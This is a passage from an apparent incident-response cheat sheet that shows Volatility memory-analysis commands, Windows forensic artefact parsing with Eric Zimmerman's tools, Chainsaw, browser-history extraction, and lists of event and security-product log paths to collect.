Get some info about the users on the machine
```sh
#run and output
vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.getsids.GetSIDs > sids.txt
#then filter
cut -f3,4 sids.txt | sort -u | pr -Ttd


#or just run it all in one. But you lose visibility to processes associated
vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.getsids.GetSIDs|
tee | cut -f3,4 | sort -u | pr -Ttd
```
![image](https://user-images.githubusercontent.com/44196051/122986422-55ec3d00-d397-11eb-8855-203125d6dd7e.png)

##### Vol2
In Volatility 2, you have to get the Profile of the image. This requires a bit more work. In theory, you can use `imageinfo` as a brute-force checker....however, this takes a long time and is probably not the best use of your valuable time.

I propose instead that you run the [Vol3](#get-profile), which will suggest what OS and build you have. Then pivot back to Vol2, and do the following:
```bash
#Collect the various profiles that exist
vol.py --info | grep Profile

#I then put these side to side in terminals, and try the different profiles with the below command
volatility -f image_dump.mem --profile=Win10x64_10586 systeminfo
```
![image](https://user-images.githubusercontent.com/44196051/123007954-f51e2e00-d3b1-11eb-938f-eb1a3cf91994.png)


Now that you have your Vol2 profile, you can leverage the plugins of both Vol2 and Vol3 with ease. 

#### Get Files
This plugin can fail on ocassion. Sometimes, it's just a case of re-running it. Other times, it may be because you need to install the symbol-tables. If it continually fails, default to python2 volatility.

```bash
sudo vol3 -f image_dump.mem windows.filescan > files.txt
cut -f2 files.txt |pr -Ttd | head -n 20

#get the size of files too
cut -f2,3 files.txt |pr -Ttd | head -n 20


#stack this will all kinds of things to find the files you want
cut -f2 files.txt | sort | grep 'ps1'
cut -f2 files.txt | sort | grep 'exe' 
cut -f2 files.txt | sort | grep 'evtx'

#Here's the Vol2 version of this
sudo vol.py -f image_dump.mem --profile=Win10x64_19041 directoryenumerator
```
![image](https://user-images.githubusercontent.com/44196051/122995420-820cbb80-d3a1-11eb-8085-a6b7d373065a.png)

![image](https://user-images.githubusercontent.com/44196051/122995678-d0ba5580-d3a1-11eb-98e4-8caf04205fe9.png)

![image](https://user-images.githubusercontent.com/44196051/122995929-27c02a80-d3a2-11eb-92a7-8c7517fd9387.png)


##### Resurrect Files
If a file catches your eye, you can push your luck and try to bring it back to life

```bash
#search for a file, as an example
cat files.txt | grep -i Powershell | grep evtx

#pick the virtual address in the first columnm, circled in the first image below
#feed it into the --virtaddr value
vol3 -f image_dump.mem windows.dumpfiles.DumpFiles --virtaddr 0xbf0f6d07ec10

#If you know the offset address, it's possible to look at the ASCII from hex
hd -n24 -s 0x45BE876 image_dump.mem
```

![image](https://user-images.githubusercontent.com/44196051/122997186-a5386a80-d3a3-11eb-9514-fb395171e4d1.png)

![image](https://user-images.githubusercontent.com/44196051/122997509-fcd6d600-d3a3-11eb-86e6-843ae3ca7efa.png)

![image](https://user-images.githubusercontent.com/44196051/123012957-24856880-d3bb-11eb-83bd-a423443d9a53.png)



### Get Sus Activity
Let's focus on retrieving evidence of suspicious and/or malicious activity from this image.

#### Get Commands
It's possible to retrieve the cmds run on a machine, sort of. 
```bash
vol3 -f image_dump.mem windows.cmdline > cmd.txt
cut -f2,3 cmd.txt | pr -Ttd

#if something catches your eye, grep for it
cut -f2,3 cmd.txt | grep -i 'powershell' | pr -Ttd

#| pr -Ttd spreads out the lines

```
![image](https://user-images.githubusercontent.com/44196051/122988527-bd0af100-d399-11eb-8947-6d2fcdceb785.png)

#### Get Network Connections

```bash
sudo vol3 -f image_dump.mem windows.netscan.NetScan > net.txt

#get everything interesting
cut -f2,5,6,9,10 net.txt | column -t
#| column -t spreads out the columns to be more readable

#extract just external IPs
cut -f5 net.txt | sort -u
#extract external IPs and their ports
cut -f5,6 net.txt | sort -u
```
![image](https://user-images.githubusercontent.com/44196051/122992887-8d121c80-d39e-11eb-9d0b-738e6c188673.png)

![image](https://user-images.githubusercontent.com/44196051/122992989-aadf8180-d39e-11eb-8119-77ccfef0896a.png)

#### Get Processes

Get a list of processes
```bash
vol3 -f image_dump.mem  windows.pslist > pslist.txt 
cut pslist.txt -f1,3,9,10 | column -t

##show IDs for parent and child, with some other stuff
cut -f1,2,3,9,10 pslist.txt
```

![image](https://user-images.githubusercontent.com/44196051/122989642-f2fca500-d39a-11eb-8a19-7bcadb83f1d9.png)

Retrieve the enviro variables surronding processes
```bash
vol3 -f image_dump.mem windows.envars.Envars > envs.txt
cut -f2,4,5 envs.txt
```
![image](https://user-images.githubusercontent.com/44196051/122988909-27239600-d39a-11eb-803e-812aa770077b.png)

Get processes with their Parent process
```bash
##This command can fail
vol3 -f image_dump.mem windows.pstree.PsTree

##we can work it our manually if we follow a PID, for example:
cat pslist.txt | grep 4352
  #we can see in the screenshot below, 4352 starts with explorer.exe at 17:39:48.
  # a number of subsequent processes are created, ultimately ending this process id with pwsh at 17:51:19
```
![image](https://user-images.githubusercontent.com/44196051/123014115-6f07e480-d3bd-11eb-9e36-0ea958b9bc2e.png)

UserAssist records info about programs that have been executed
```bash
vol3 -f image_dump.mem windows.registry.userassist > userassist.txt
grep '*' userassist.txt| cut -f2,4,6,10 | pr -Ttd

#Here we get the ntuser.dat, which helps us figure our which user ran what
  # We also get start time of a program, the program itself, and how long the program was run for 
```
![image](https://user-images.githubusercontent.com/44196051/123015484-6f55af00-d3c0-11eb-9230-4a0b0bd75d14.png)


Dump files associated with a process. Usually EXEs and DLLs.
```bash
#zero in on the process you want
cut pslist.txt -f1,3,9,10 | grep -i note | column -t

#then, get that first columns value. The PID
sudo vol3 -f image_dump.mem -o . windows.dumpfiles --pid 2520

#here's an alternate method. Sometimes more reliable, errors out less.
cat pslist.txt | grep 6988
sudo vol3 -f image_dump.mem windows.pslist --pid 6988 --dump
sudo file pid.6988.0x1c0000.dmp
```
![image](https://user-images.githubusercontent.com/44196051/122990657-1ecc5a80-d39c-11eb-85e0-add64e403b25.png)

![image](https://user-images.githubusercontent.com/44196051/123010258-2b5dac80-d3b6-11eb-9352-a43bd1effd87.png)

## Quick Forensics

<details>
   <summary>section contents</summary>

  + [Prefetch](#prefetch)
  + [Query Background Activity Moderator](#Query-Background-Activity-Moderator)
  + [Shimcache](#shimcache)
  + [Jump Lists](#jump-lists)
  + [SRUM](#SRUM)
  + [Amcache](#amcache) 
  + [Certutil History](#certutil-history)
  + [WER](#WER)
  + [BITS](#BITS)
  + [Forensic via Power Usage](#Forensic-via-Power-Usage)
  + [Activities Cache](#Activities-Cache)
  + [Program Compatibility Assistant](#Program-Compatibility-Assistant)

 
</details>

I've spoken about some forensic techniques [here, as a coprorate simp](https://www.huntress.com/resources/tradecraft-tuesday?wchannelid=zy8dl5egyy&wmediaid=s5rb646tl8)

I've also got a [repo](https://github.com/Purp1eW0lf/quickforensics) with some emulated attack data to be extracted from some forensic artefacts
### Prefetch

You can query the prefetch directory manually

```powershell
dir C:\Windows\Prefetch | sort LastWriteTime -desc

# Look for a specifc exe - good for Velociraptor hunts 
# if you see one machine has executed something suspicious, you can then run thisnetwork wide
 dir C:\Windows\prefetch |  ? name -match "rundll" 

```
![7-edited-1](https://user-images.githubusercontent.com/44196051/144207365-574d5d8b-41f3-41c7-97b3-0c257f31c4d3.png)

But Eric'z [PECmd](https://github.com/EricZimmerman/PECmd) makes it a lot easier

```powershell
# I’d advise picking the -f flag, and picking on one of the prefetch files you see in the directory
.\PECmd.exe -f ‘C:\Windows\prefetch\MIMIKATZ.EXE-599C44B5.pf’ 

#get granular timestamps by adding -mp flag
.\PECmd.exe -f C:\Windows\prefetch\MIMIKATZ.EXE-599C44B5.pf -mp

# If you don’t know what file you want to process, get the whole directory. Will be noisy though and I wouldn’t recommend
.\PECmd.exe -d 'C:\Windows\Prefetch' --csv . #dot at the end means write in current directory
```
![8-edited](https://user-images.githubusercontent.com/44196051/144207409-d517823c-c796-45d5-871a-6c7d647c70be.png)

Prefetch is usually enabled on endpoints and disabled on servers. To re-enable on servers, run this:
```cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 3 /f;
 
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Prefetcher" /v MaxPrefetchFiles /t REG_DWORD /d 8192 /f;
 
Enable-MMAgent –OperationAPI;
 
net start sysmain
```

### Query Background Activity Moderator

[Elsewere in the repo]((#Query-Background-Activity-Moderator))

### Shimcache

[Shimcache](https://www.fireeye.com/content/dam/fireeye-www/services/freeware/shimcache-whitepaper.pdf) – called AppCompatCache on a Windows machine – was originally made to determine interoperability issues between Windows versions and applications.  Like prefetch, we can leverage shimcache to identify evidence of execution on a machine when we do not have event logs. 

[Another Eric Zimmerman tool](https://ericzimmerman.github.io/#!index.md) called AppCompatCacheParser can give us insight into what was run on the system. 

```powershell
.\AppCompatCacheParser.exe -t --csv . --csvf shimcache.csv
```
![12-edited](https://user-images.githubusercontent.com/44196051/144207005-07ed24cb-75df-4832-814a-4928d711a0c7.png)

This will create a CSV, which you could import to your spreadsheet of choice… but some quick PowerShell can give you some visibility. There will be a lot of noise here, but if we filter through we can find something quite interesting.

```powershell
import-csv .\shimcache.csv | sort lastmodified -Descending | fl path,last*
```
![13-edited](https://user-images.githubusercontent.com/44196051/144207226-bc680044-d047-42c8-b783-1f22cd29c81c.png)

### Jump Lists

You can parse Jump Lists so they are very pretty....but if you're in a hurry, just run something ugly like this

```powershell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\* |
flarestrings | 
sort
```
<img width="1054" alt="image" src="https://user-images.githubusercontent.com/44196051/154823481-2dc80d77-9976-4a8b-9a88-4a7ff836956f.png">

Or use another of [Eric's tools](https://f001.backblazeb2.com/file/EricZimmermanTools/JLECmd.zip%20-outfile%20JLECmd.zip)
```powershell
.\JLECmd.exe -d .\jump\ --all --mp --withDir -q --html .
# \jump\ is the directory my files are in

#Then, run this to open the report
iex ./*/*.xhtml

```
![image](https://user-images.githubusercontent.com/44196051/159500526-0c898b06-d7d5-4570-8024-dc8959ea24f7.png)
![image](https://user-images.githubusercontent.com/44196051/159501997-7a5d1596-4fa3-433e-a434-f24cc7a4b4e9.png)


If you’re me, you’ll export it to --csv instead, and then use PowerShell to read the headers that you care about

```
 #export to CSV
.\JLECmd.exe -d .\jump\ --all --mp --withDir --csv ./
 #read the csv
Import-Csv .\20220322131011_AutomaticDestinations.csv | 
select TargetIDAbsolutePath,InteractionCount,CreationTime,LastModified,TargetCreated,Targetmodified,TargetAccessed | 
sort InteractionCount -desc
```
![image](https://user-images.githubusercontent.com/44196051/159501223-dc3f62b6-547e-494c-9585-81570b0e8cbd.png)


### SRUM
I wrote a [short thread on SRUM](https://twitter.com/Purp1eW0lf/status/1504491533487296517?s=20&t=q0_MBDCW35SCxH4a65087Q)

Collect SRUM file from `C:\Windows\System32\sru\SRUDB.dat`

You can use another of [Eric's tools](https://f001.backblazeb2.com/file/EricZimmermanTools/SrumECmd.zip) to parse it

```powershell
.\SrumECmd.exe -f .\SRUDB.dat --csv .
```
![image](https://user-images.githubusercontent.com/44196051/158850898-7f3e463f-2316-418d-8d92-56bc5ab2427a.png)

![image](https://user-images.githubusercontent.com/44196051/158826331-fec3e11d-aa2a-432a-abe5-d6bdbe42e41e.png)

You will get a tonne of results. Prioritise the following:
* SrumECmd_NetworkUsages_Output.csv
* SrumECmd_AppResourceUseInfo_Output.csv
* SrumECmd_Unknown312_Output.csv (occasionally)

![image](https://user-images.githubusercontent.com/44196051/158851747-d9fdabc8-15da-4d70-8d93-883c577b68a1.png)


### Amcache
You can get amcache hive from `C:\Windows\AppCompat\Programs\Amcache.hve`. You may need to copy the file by volume shadow or other means if it won't let you copy it directly.

Another one of [Eric's tools](https://f001.backblazeb2.com/file/EricZimmermanTools/AmcacheParser.zip) will help us
```powershell
.\AmcacheParser.exe -f '.\Amcache.hve' --mp --csv .
```

![image](https://user-images.githubusercontent.com/44196051/158851682-5c518dcd-7500-42c9-a052-486df7f8b2ed.png)

You can read the subsequent CSVs in a GUI spreadsheet reader, or via PwSh

```import-csv .\20220316115945_Amcache_UnassociatedFileEntries.csv | 
select ProgramName,Fullpath,Filesize,FileDescription,FileVersionNumber,Created,Last*,ProductName,CompanyName | 
sort -desc LastModified |
more
#You can exit this by pressing q
```

![image](https://user-images.githubusercontent.com/44196051/158851558-bceea935-c3bc-44ed-bbac-db439435eba8.png)

### Certutil History
If you have an interactive session on the machine

```powershell
certutil.exe -urlcache | 
select-string  -Pattern 'ocsp|wininet|winhttp|complete|update|r3'  -NotMatch | 
sort
```

<img width="821" alt="image" src="https://user-images.githubusercontent.com/44196051/171147357-ece409d0-a658-4340-985f-aac58d5f3c14.png">

Otherwise, you can look in this directory:

```powershell
C:\Users\*\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\*
```

<img width="1410" alt="image" src="https://user-images.githubusercontent.com/44196051/171153422-e32c74b5-b088-4e52-bdb0-478023dd843e.png">

### WER
Windows Error Reporting (WER) is a diagnostic functionality that we don’t need to get too deep in the weeds about for this post. 

When an application crashes, WET gets some contextual info around the crash. This presents an opportunity for us to [retrieve DFIR data that may tell us something about the adversary or malware](http://journeyintoir.blogspot.com/2014/02/exploring-windows-error-reporting.html)

Take a look at the various directories, and eventually retrieve a .WER file

```
C:\ProgramData\Microsoft\Windows\WER\ReportArchive
C:\ProgramData\Microsoft\Windows\WER\ReportQueue
C:\Users\*\AppData\Local\Microsoft\Windows\WER\ReportArchive
C:\Users\*\AppData\Local\Microsoft\Windows\WER\ReportQueue
```

### BITS

BITS is a lolbin and can be abused by threat actors to do a myriad of things
* https://isc.sans.edu/forums/diary/Investigating+Microsoft+BITS+Activity/23281/
* https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
* https://www.mandiant.com/resources/attacker-use-of-windows-background-intelligent-transfer-service


<img width="1078" alt="image" src="https://user-images.githubusercontent.com/44196051/175783848-361ba56b-e2e2-499b-a1db-f9c89ae1ffd8.png">


Then use [bitsparser tool](https://github.com/fireeye/BitsParser)

#### Forensic via Power Usage

[From Ryan](https://twitter.com/rj_chap/status/1502354627903123458)

Good for catching coin miners that are too resource hungry

Can do this via SRUM, but this is ‘quicker’ as no need to parse the XMLs

Location
```
C:\ProgramData\Microsoft\Windows\Power Efficiency Diagnostics\*.xml
```
Collect a bunch of these, and then use some command line text editing:

```bash
cat *.xml | egrep -i -A 1 '<name>(module|process name)</name>' | grep -i '<value>' | sort | uniq -c
```

![image](https://user-images.githubusercontent.com/44196051/196246382-6a0855ca-b3d1-4976-8d5a-eb01d6bba756.png)

  
### Activities Cache

Win10/11 telemetry source only. Very accurate timeline of user activities

Location
```
C:\Users\<username>\AppData\Local\ConnectedDevicesPlatform\L.<username>\ActivitiesCache.db

#example for user `foster`
C:\Users\foster\AppData\Local\ConnectedDevicesPlatform\L.foster\ActivitiesCache.db
```

Parse with Eric Zimmerman’s [WxTCmd](https://f001.backblazeb2.com/file/EricZimmermanTools/WxTCmd.zip)

```cmd
.\WxTCmd.exe -f ./ActivitiesCache.db --csv .
```
![image](https://user-images.githubusercontent.com/44196051/196245832-fe0666e7-5fa7-4f16-9742-28ff79ac4a8d.png)

We get two results, but the most interesting is %Date%__Activity.csv

Opening this up in Excel, we can start to play around with the data.

<img width="1213" alt="image" src="https://user-images.githubusercontent.com/44196051/196246018-a4582a2d-ee50-461d-8db0-c5375fd959ee.png">

Can also use [WindowsTimeline.exe](https://github.com/kacos2000/WindowsTimeline/releases/download/v.2.0.81.0/WindowsTimeline.exe) tooling

![image](https://user-images.githubusercontent.com/44196051/217583585-b676c1d9-9379-432e-bb50-b7cc02078223.png)

I prefer to dump the data from the GUI

![image](https://user-images.githubusercontent.com/44196051/217583653-faf7c90f-48f2-4919-8171-001a53aae5d0.png)

You will get a folder with some goodies. The two CSVs to focus on are: ApplicationExecutionList, WindowsTimeline. The former is easier to interpet than the latter

Grepping via timestamp makes most sense IMO for WindowsTimeline.csv.
```bash
grep '2023-02-02T18' WindowsTimeline.csv \
| awk -F'|' '{print "StartTime:" $36 " | Executed: "$2}' | sort 
```
![image](https://user-images.githubusercontent.com/44196051/217584103-be65ae21-40f9-4427-843a-583593a296ee.png)


### Program Compatibility Assistant

Like prefetch…but not, [PCA artifacts](https://aboutdfir.com/new-windows-11-pro-22h2-evidence-of-execution-artifact/) offer additional forensic insight into the fullpath execution times of exes on Win11 machines

Collect the following
```
C:\Windows\appcompat\pca\PcaAppLaunchDic.txt #most crucial file to collect
                  # contains reliable timiestamps for last executed, like prefetch
C:\Windows\appcompat\pca\PcaGeneralDb0.txt # has more metadata about the exe

C:\Windows\appcompat\pca\PcaGeneralDb1.txt # seems to be empty a lot of the time
```

As these files are txts, you can just read them.

However, PcaGeneralDb0.txt contains some verbose meta data, so you can deploy something like this to have both TXTs normalised and readable:

```bash
paste <(cut -d'|' -f3 PcaGeneralDb0.txt) <(cut -d'|' -f1 PcaGeneralDb0.txt) \
&& paste <(cut -d'|' -f1 PcaAppLaunchDic.txt) <(cut -d'|' -f2 PcaAppLaunchDic.txt)\
| tee | sort -u
```
![image](https://user-images.githubusercontent.com/44196051/210581602-84b60525-4849-42a0-971f-d5e9253c2a2a.png)

#### PCA Registry Data

Program Compatibility Assistant also stores data in some Registry keys. Chatting with my man [@biffbiffbiff](https://twitter.com/biffbiffbiff), we have some options to carve that out 

```powershell
mount -PSProvider Registry -Name HKU -Root HKEY_USERS;

(gci "HKU:\*\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\", "HKU:\*\Software\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers").PsPath |
Foreach-Object {
  write-host "----Reg location is $_---" -ForegroundColor Magenta ; 
  gp $_ | 
  select -property * -exclude PS*, *one*, *edge* 
  FL
} 

```
<img width="1411" alt="image" src="https://user-images.githubusercontent.com/44196051/217371720-7c0f5554-7e72-4313-a38a-7101b88688e7.png">

Or for something less fancy, but won't print the User SID so it may not be evident which account did what

```powershell
mount -PSProvider Registry -Name HKU -Root HKEY_USERS;
(gci "HKU:\*\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\", "HKU:\*\Software\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers").Property
```
<img width="1161" alt="image" src="https://user-images.githubusercontent.com/44196051/217371811-9a2789ed-6696-4ead-b4ae-a49709b65c74.png">


## Chainsaw

[Chainsaw](https://labs.f-secure.com/tools/chainsaw/) is an awesome executable for Windows event logs, that leverages sigma rules to carve through the logs and highlight some of the suspicious activity that may have taken place.

It's relatively easy to install and use. You can take logs from a victim machine, and bring them over to chainsaw on your DFIR VM to be examined, you just have to point chainsaw at the directory the collected logs are in

```powershell
.\chainsaw.exe hunt 'C:\CollectedLogs' --rules sigma_rules/ --mapping mapping_files/sigma-mapping.yml
```

![image](https://user-images.githubusercontent.com/44196051/134974297-020c7ab1-dbd4-494a-ad18-49bf7a3fa2fb.png)

## Browser History
We can go and get a users' browers history if you have the machine.

You'll find the SQL DB file that stores the history in the following:

* Chrome `:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History`
* Edge `C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default\History`
* Safari `/System/Volumes/Data/Users/*/Library/Safari/History.db , Downloads.plist `
* Firefox `C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\Downloads.json, Places.sqlite`

Once retrieved, you can open it via sqlite3 or a [web-browser GUI](https://extendsclass.com/sqlite-browser.html#).
* The GUI doesn't need much guidance, so lets chat command line.

Fire it up: `sqlite3 history.db`

![image](https://user-images.githubusercontent.com/44196051/154080052-320f64aa-76d6-40e6-9298-67a6405965ef.png)

List the tables, which are like ‘folders’ that contain categorised data

```
.tables
```

![image](https://user-images.githubusercontent.com/44196051/154080084-4f297bdd-5356-4ba7-8654-0ff8032d4882.png)

If you just run `select * from downloads;`, you’ll be annoyed by the messy output
![image](https://user-images.githubusercontent.com/44196051/154080177-14b122ab-9c29-40fe-82b8-d26dea0c0735.png)

To transform the data to something more useful to look at, try this, which will open it up in excel:

```
.excel
.headers on 
 select * from downloads;
 ```
 
 ![image](https://user-images.githubusercontent.com/44196051/154080344-ab7946d9-279f-47a7-ac7a-5fd41742ae64.png)


And then if you tidy this up it's easy to see what the user downloaded and from where

<img width="1296" alt="image" src="https://user-images.githubusercontent.com/44196051/154080684-142e6ede-1d8a-48e2-a879-bf0596fbbbba.png">


You can also tidy it up with the following
```
.mode line #makes it look niceer
select * from moz_places;
```

![image](https://user-images.githubusercontent.com/44196051/155850582-e78c365b-26f6-4315-9f8b-abc9bee13e95.png)


## Which logs to pull in an incident

- [Basics](#basics)
- [Security Products Logs](#Security-Products-Logs)
- [Other Microsoft logs](#Other-Microsoft-logs)
- [Remote Management Logs](#Remote-Management-Logs)
- [Cerutil History](#cerutil-history)

## Basics

Windows Event Logs can be found in `C:\windows\System32\winevt\Logs\`. To understand the general Event IDs and logs, you can [read more here](https://forwarddefense.com/media/attachments/2021/05/15/windows-event-log-analyst-reference.pdf)

But knowing which logs to pull of the hundreds can be disorientating. Fortunately, there really aren’t that many to work with. This is for a myriad of reasons:
* Most clients will not flick on additional logging features. This means that there are actually few logs that provide security value
* A lot of logs are diagnostic in nature, so we don’t have to pull these.
* Even when certain logs do have security value - like PowerShell logs - if an incident happened 2 months ago, and a partner did not store their logs elsewhere it is likely that these logs have been overwritten. 

Let’s signpost the logs you absolutely want to grab every time.

##### [Here's a script that can automate collection for staple logs from below](https://gist.github.com/Purp1eW0lf/e0b757e66d5da629c1d03e2941fa5b4b)

#### Sysmon
`C:\windows\System32\winevt\Logs\Sysmon.evtx`

You’re never going to see Sysmon deployed. In 99% of the incidents I’ve been in, they never have it.

But if you DO ever see sysmon, please do pull this log. It is designed to enrich logs with security value, and is a standard tool for many SOCs / SIEMs

#### Holy Trinity
```
C:\windows\System32\winevt\Logs\Application.evtx
C:\windows\System32\winevt\Logs\Security.evtx
C:\windows\System32\winevt\Logs\System.evtx
```

These are the staple logs you will likely pull every single time. 

These are the logs that will give you a baseline insight into an incident: the processes, the users, the sign ins (etc)

#### Defender & security products

`C:\windows\System32\winevt\Logs\Microsoft-Windows-Windows Defender%4Operational.evtx`

We already get Defender alerts, but pulling the defender log is beneficial for log ingestion later. We can correlate Defender alerts to particular processes.


#### PowerShell

`C:\windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx`

By default, PowerShell logs are pretty trash. But I’ll pull them regardless if there is ever an AMSI / PwSh related alert or artefact in the other logs. This will give insight into the commands an adversary has run.

If you know the user who is involved in the suspicious process, there is a [PowerShell history artefact](#All-Users-PowerShell-History) you can pull on. 

`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

Replace the username field with the username you have, and you will get a TXT file with the history of the users PowerShell commands - sometimes!

#### RDP and WinRM logs

```
C:\windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx
C:\windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx
C:\windows\System32\winevt\Logs\Microsoft-Windows-WinRM%4Operational.evtx
```

Pull these to gain insight into the username, source IP address, and session time for RDP and WinRM’s PowerShell remoting. This resource can advise further: https://ponderthebits.com/2018/02/windows-rdp-related-event-logs-identification-tracking-and-investigation/


If you've got ["RDS.. through the Remote Desktop Gateway"](https://woshub.com/rdp-connection-logs-forensics-windows/) collect `C:\Windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-Gateway%4Operational.evtx`. Filter for the following Event IDs:
- 300 & 200 will show the username and IP address that was part of the authentication
- 303 will show the above, but also session duration show BYTES IN and OUT, which may give some context for data exfil (but vague context)

![image](https://user-images.githubusercontent.com/44196051/217901018-f23990ee-95e9-4c45-bdc2-247605673c25.png)


#### Miscellaneous logs

There are some other logs that you’ll pull on if the context is appropiate

`C:\windows\System32\winevt\Logs\Microsoft-Windows-Shell-Core%4Operational.evtx` 

* This can offer insight into execution from registry run keys

`C:\windows\System32\winevt\Logs\Microsoft-Windows-Bits-Client%4Operational.evtx`

* Adversaries can use BITS to do all kinds of malicious things

`C:Windows\System32\winevt\Logs\Microsoft-WindowsTaskScheduler%4Operational`

* Detail in scheduled tasks - though we would likely be able to get this telemtry elsewhere

### Security Products Logs
Sometimes, it’s helpful to go and pull other Security Solutions' logs and files.

Much of the below is taken from [Velociraptor's implementation of KAPE](https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/KapeFiles/Targets.yaml)

Bitdefender:

```
C:\ProgramData\Bitdefender\Endpoint Security\Logs\

C:\ProgramData\Bitdefender\Desktop\Profiles\Logs\

C:\Program Files*\Bitdefender*\*\.db

C:\Program Files\Bitdefender\Endpoint Security\Logs\system\*\*.xml

C:\ProgramData\Bitdefender\Endpoint Security\Logs\Firewall\*.txt
```

Carbon Black

```
C:\ProgramData\CarbonBlack\Logs\*.log

C:\ProgramData\CarbonBlack\Logs\AmsiEvents.log 
```

Cisco AMP

```
C:\Program Files\Cisco\AMP\*.db
```

Cylance / Blackberry
```
C:\ProgramData\Cylance\Desktop

C:\Program Files\Cylance\Desktop\log\* log

C:\ProgramData\Cylance\Desktop\chp.db 

C:\ProgramData\Cylance\Optics\Log
```

Elastic Endpoint Security
```
C:\program files \elastic\endpoint\state\log
```

ESET: Parser available at https://github.com/laciKE/EsetLogParser

```
C:\ProgramData\ESET\ESET NOD32 Antivirus\Logs\
```
FireEye Endpoint Security

Databases were encrypted, so can’t be accessed easily. From Fireeye documentation, you can get logs via command ‘xagt -g example_log.txt’. 
```
C:\ProgramData\FireEye\xagt\*.db
```

F-Secure

```
C:\Users\*\AppData\Local\F-Secure\Log\*\*.log

C:\ProgramData\F-Secure\Antivirus\ScheduledScanReports\

C:\ProgramData\F-Secure\EventHistory\event
```

Kaspersky
 
```
C:\Windows\system32\winevt\logs
```


Malware Bytes

```
C:\ProgramData\Malwarebytes\Malwarebytes Anti-Malware\Logs\mbam-log-*.xml

C:\PogramData\Malwarebytes\MBAMService\logs\mbamservice.log

C:\Users\*\AppData\Roaming\Malwarebytes\Malwarebytes Anti-Malware\Logs\

C:\ProgramData\Malwarebytes\MBAMService\ScanResults\
```

McAfee

```
C:\ProgramData\McAfee\Endpoint Security\Logs\*.log

C:\ProgramData\McAfee\Endpoint Security\Logs_Old\*

C:\ProgramData\Mcafee\VirusScan\*

C:\ProgramData\McAfee\VirusScan\Quarantine\quarantine\*.db

C:\ProgramData\McAfee\DesktopProtection\*.txt
```

Palo Alto Networks XDR

```
C:\ProgramData\Cyvera\Logs\*.log
```

Sentinel One:

```
C:\programdata\sentinel\logs\*.log, *.txt

C:\windows\System32\winevt\Logs\SentinelOne*.evtx

C:\ProgramData\Sentinel\Quarantine
```

Sophos: 

```
C:\ProgramData\Sophos\Sophos Anti-Virus\logs\*.txt.

C:\ProgramData\Sophos\Endpoint Defense\Logs\*.txt
```

Symanetic

```
C:\ProgramData\Symantec\Symantec Endpoint Protection\*\Data\Logs\

C:\Users\*\AppData\Local\Symantec\Symantec Endpoint Protection\Logs\

C:\Windows\System32\winevt\logs\Symantec Endpoint Protection Client.evtx

C:\ ProgramData\Symantec\Symantec Endpoint Protection\*\Data\Quarantine\

```

Trend Micro

```
C:\ProgramData\Trend Micro\

C:\Program Files*\Trend Micro\Security Agent\Report\*.log,

C:\Program Files*\Trend Micro\Security Agent\ConnLog\*.log
```

Webroot:

`C:\ProgramData\WRData\WRLog.log`

### Other Microsoft logs


Defender:

```
C:\ProgramData\Microsoft\Microsoft AntiMalware\Support\

C:\ProgramData\Microsoft\Windows Defender\Support\

C:\Windows\Temp\MpCmdRun.log
```

IIS (web) logs - can be application specific log directories and names at times
```
C:\Windows\System32\LogFiles\W3SVC*\*.log

C:\Inetpub\logs\LogFiles\*.log

C:\inetpub\logs\LogFiles\W3SVC*\*.log,

C:\Resources\Directory\*\LogFiles\Web\W3SVC*\*.log
```

MSQL

`C:\Program Files\Microsoft SQL Server\*\MSSQL\LOG\ERRORLOG`

OneNote

```
C:\Users\*\AppData\Local\Packages\Microsoft.Office.OneNote_8wekyb3d8bbwe\LocalState\AppData\Local\OneNote\*\FullTextSearchIndex

C:\Users\*\AppData\Local\Packages\Microsoft.Office.OneNote_8wekyb3d8bbwe\LocalState\AppData\Local\OneNote\Notifications\RecentNotebooks_SeenURLs

C:\Users\*\AppData\Local\Packages\Microsoft.Office.OneNote_8wekyb3d8bbwe\LocalState\AppData\Local\OneNote\16.0\AccessibilityCheckerIndex

C:\Users\*\AppData\Local\Packages\Microsoft.Office.OneNote_8wekyb3d8bbwe\LocalState\AppData\Local\OneNote\16.0\NoteTags\*LiveId.db,

C:\Users\*\AppData\Local\Packages\Microsoft.Office.OneNote_8wekyb3d8bbwe\LocalState\AppData\Local\OneNote\16.0\RecentSearches\RecentSearches.db
```

Teams
```
C:\Users\*\AppData\Roaming\Microsoft\Teams\IndexedDB\https_teams.microsoft.com_0.indexeddb.leveldb\

C:\Users\*\AppData\Roaming\Microsoft\Teams\Local Storage\leveldb\

C:\Users\*\AppData\Roaming\Microsoft\Teams\Cache\

C:\Users\*\AppData\Roaming\Microsoft\Teams\desktop-config.json,lazy_ntfs,JSON config file for Teams      

C:\Users\*\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\Logs
```

OneDrive

```
C:\Users\*\AppData\Local\Microsoft\OneDrive\logs\

C:\Users\*\AppData\Local\Microsoft\OneDrive\settings\

C:\Users\*\OneDrive*\
```

PST & OSTs

```
C:\Users\*\Documents\Outlook Files\*.pst

C:\Users\*\Documents\Outlook Files\*.ost

